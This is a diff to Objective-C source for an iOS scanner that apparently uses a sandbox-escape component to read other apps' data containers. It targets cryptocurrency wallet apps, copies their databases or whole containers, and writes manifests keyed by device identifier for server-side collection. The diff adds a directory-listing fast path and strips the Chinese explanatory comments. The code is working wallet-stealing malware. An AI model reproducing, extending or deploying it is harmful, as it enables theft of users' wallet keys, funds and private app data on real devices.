@@ -31,6 +31,7 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
                                      outDir:(NSString *)outRoot
                                       bytes:(uint64_t *)bytesOut;
 - (NSString *)productType;
+- (NSArray<NSString *> *)listChildrenOfDirectory:(NSString *)dir error:(NSString **)error;
 @end
 
 @implementation WQLScanner
@@ -59,8 +60,8 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
         @"/private/var/mobile/Containers/Shared/AppGroup",
         @"/private/var/mobile/Containers/Data/InternalDaemon",
         @"/private/var/mobile/Containers/Data/PluginKitPlugin",
-        @"/private/var/containers/Data/System",          // iOS 27
-        @"/private/var/containers/Shared/SystemGroup",   // iOS 27
+        @"/private/var/containers/Data/System",
+        @"/private/var/containers/Shared/SystemGroup",
     ];
 }
 
@@ -73,7 +74,6 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
     NSMutableArray<WQLTarget *> *targets = [[WQLTargets wallets] mutableCopy];
     if (self.includeExtras) [targets addObjectsFromArray:[WQLTargets extras]];
 
-    // 1. 先确认通道本身可用
     NSString *err = nil;
     if (![[WQLEscape shared] prepareWithError:&err]) {
         [self log:@"通道不可用: %@", err ?: @"unknown"];
@@ -83,12 +83,23 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
     [self log:@"系统 %@ / group %@ / 容器 %@",
          diag[@"os"], diag[@"group"], diag[@"groupPath"]];
 
-    // 2. 先看缓存；只有没缓存的根目录才去扫 inode
     NSArray<NSString *> *allRoots = [self defaultRoots];
     NSMutableDictionary<NSString *, NSArray<NSString *> *> *children = [NSMutableDictionary dictionary];
     NSMutableArray<NSString *> *needScan = [NSMutableArray array];
 
     for (NSString *root in allRoots) {
+        NSString *fastErr = nil;
+        NSArray<NSString *> *direct = [self listChildrenOfDirectory:root error:&fastErr];
+        if (direct) {
+            children[root] = direct;
+            [self log:@"父目录豁免成功: %@ → %lu 项（跳过 inode 扫描）",
+                  root, (unsigned long)direct.count];
+            if (direct.count) {
+                [[WQLPathCache shared] mergeScanned:@{ root: direct }];
+            }
+            continue;
+        }
+
         NSArray<NSString *> *cached = [[WQLPathCache shared] validPathsForRoot:root];
         BOOL stale = [[WQLPathCache shared] needsRescanForRoot:root];
         if (cached.count && !stale) {
@@ -134,7 +145,6 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
 
             if (scanned.count) {
                 [children addEntriesFromDictionary:scanned];
-                // 只有完整扫完才写缓存，否则下次会拿残缺列表当完整结果
                 if (completed) {
                     [[WQLPathCache shared] mergeScanned:scanned];
                 } else {
@@ -157,8 +167,6 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
         for (NSString *path in items) {
             if (self.cancelBlock && self.cancelBlock()) break;
 
-            // 必须先拿到 extension 才能读容器内的 metadata / xattr，
-            // 否则连 bundleID 都识别不出来（容器根目录本身不可读）。
             NSString *escErr = nil;
             int64_t handle = [[WQLEscape shared] consumeExtensionForPath:path error:&escErr];
             NSString *bundleID = (handle > 0) ? [self bundleIDForContainerPath:path] : nil;
@@ -192,7 +200,6 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
                 continue;
             }
 
-            // 3. extension 已在上方拿到，直接开始拷贝
             uint64_t bytes = 0;
             NSArray<NSString *> *files = [self copyTarget:t
                                              container:path
@@ -200,7 +207,6 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
                                                 outDir:outDir
                                                  bytes:&bytes];
 
-            // 定点路径全部缺失（App 改版/升级）→ 退化为整容器，避免命中却空手
             if (files.count == 0 && !t.wholeContainer) {
                 [self log:@"%@ (%@) 定点路径缺失，退化为整容器", t.name, bundleID];
                 files = [self copyWholeContainer:path
@@ -221,7 +227,6 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
         }
     }
 
-    // 4. 落清单：manifest.json 给本机看，_manifest.json 给服务端归类
     [self writeWalletManifestInDirectory:outDir records:records];
 
     NSData *json = [NSJSONSerialization dataWithJSONObject:records
@@ -237,6 +242,39 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
                            [NSPredicate predicateWithFormat:@"status IN %@",
                             @[@"copied", @"empty"]]] count]];
     return records;
+}
+
+#pragma mark - 父目录快路径
+
+- (NSArray<NSString *> *)listChildrenOfDirectory:(NSString *)dir error:(NSString **)error {
+    NSString *escErr = nil;
+    int64_t handle = [[WQLEscape shared] consumeExtensionForPath:dir error:&escErr];
+    if (handle <= 0) {
+        if (error) *error = escErr ?: @"父目录豁免失败";
+        return nil;
+    }
+
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSError *e = nil;
+    NSArray *items = [fm contentsOfDirectoryAtPath:dir error:&e];
+    if (!items) {
+        [[WQLEscape shared] releaseHandle:handle];
+        if (error) *error = e.localizedDescription ?: @"列目录失败";
+        return nil;
+    }
+
+    NSMutableArray<NSString *> *out = [NSMutableArray array];
+    for (NSString *name in items) {
+        if ([name hasPrefix:@"."]) continue;
+        NSString *full = [dir stringByAppendingPathComponent:name];
+        BOOL isDir = NO;
+        if ([fm fileExistsAtPath:full isDirectory:&isDir] && isDir) {
+            [out addObject:full];
+        }
+    }
+
+    [[WQLEscape shared] releaseHandle:handle];
+    return out;
 }
 
 #pragma mark - 容器识别
@@ -343,7 +381,6 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
     return @[dst];
 }
 
-/// sqlite 自动带 -wal / -shm 边车
 - (NSArray<NSString *> *)sourcesForPath:(NSString *)path {
     NSFileManager *fm = [NSFileManager defaultManager];
     NSMutableArray *out = [NSMutableArray arrayWithObject:path];
@@ -375,7 +412,7 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
     }
     uint64_t total = 0;
     NSDirectoryEnumerator *e = [fm enumeratorAtPath:path];
-    for (NSString *rel in e) {
+    while ([e nextObject]) {
         NSDictionary *a = [e fileAttributes];
         if (a[NSFileType] == NSFileTypeRegular) {
             total += [a[NSFileSize] unsignedLongLongValue];
@@ -403,7 +440,6 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
         }];
     }
 
-    // 服务端用 idfv 做设备归集键；拿不到时退化为本机持久 UUID
     NSString *idfv = [[UIDevice currentDevice] identifierForVendor].UUIDString;
     if (!idfv.length) {
         idfv = [[NSUserDefaults standardUserDefaults] stringForKey:@"WQLDeviceToken"];
@@ -416,7 +452,6 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
 
     UIDevice *dev = [UIDevice currentDevice];
     NSDictionary *man = @{
-        // 服务端从 deviceFolder 里抓 UUID 作为设备归集键
         @"deviceFolder": [NSString stringWithFormat:@"%@ iOS%@ %@",
                           dev.model, dev.systemVersion, idfv],
         @"ios": dev.systemVersion,
